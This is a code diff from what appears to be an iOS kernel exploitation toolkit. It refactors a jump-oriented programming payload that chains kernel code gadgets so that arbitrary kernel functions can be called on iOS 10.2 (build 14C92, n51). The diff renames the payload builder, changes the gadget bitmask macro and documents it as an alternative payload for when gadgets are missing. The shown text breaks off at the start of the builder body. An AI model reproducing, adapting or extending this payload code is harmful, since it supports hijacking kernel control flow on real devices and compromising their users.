@@ -9,10 +9,7 @@
 #include "aarch64/jop/call_strategy.h"
 #include "aarch64/jop/gadgets_static.h"
 
-static void jop_2(uint64_t, const uint64_t[8], const uint64_t[8], kaddr_t,
-		void *, struct jop_call_initial_state *, uint64_t *);
-
-#define NEED(block, gadget)	(((uint64_t)1) << (gadget % (8 * sizeof(uint64_t))))
+#define NEED(block, gadget)	((uint64_t)1 << (gadget - 64 * block))
 
 static const uint64_t gadgets_0 =
 	  NEED(0, LDP_X2_X1_X1__BR_X2)
@@ -43,21 +40,24 @@ static const uint64_t gadgets_0 =
 	| NEED(0, STR_X0_X20__LDR_X8_X21__LDR_X8_X8_28__MOV_X0_X21__BLR_X8)
 	| NEED(0, MOV_X30_X28__BR_X8);
 
-struct jop_call_strategy jop_call_strategy_2 = {
-	{ gadgets_0 }, 0x400, 0, jop_2,
-};
+static void build(uint64_t, const uint64_t[8], kaddr_t,
+		void *, struct jop_call_initial_state *, uint64_t *);
 
 /*
- * jop_2
+ * jop_call_strategy_2
  *
  * Description:
- * 	An alternative JOP payload.
+ * 	An alternative JOP payload in case of missing gadgets.
  *
  * Platforms:
  * 	iOS 10.2 14C92: n51
  */
+struct jop_call_strategy jop_call_strategy_2 = {
+	{ gadgets_0 }, 0x400, 0, build,
+};
+
 static void
-jop_2(uint64_t func, const uint64_t args[8], const uint64_t stack[8], kaddr_t kernel_payload,
+build(uint64_t func, const uint64_t args[8], kaddr_t kernel_payload,
 		void *payload0, struct jop_call_initial_state *initial_state,
 		uint64_t *result_address) {
 	const size_t VALUE_STACK_OFFSET  = 0;
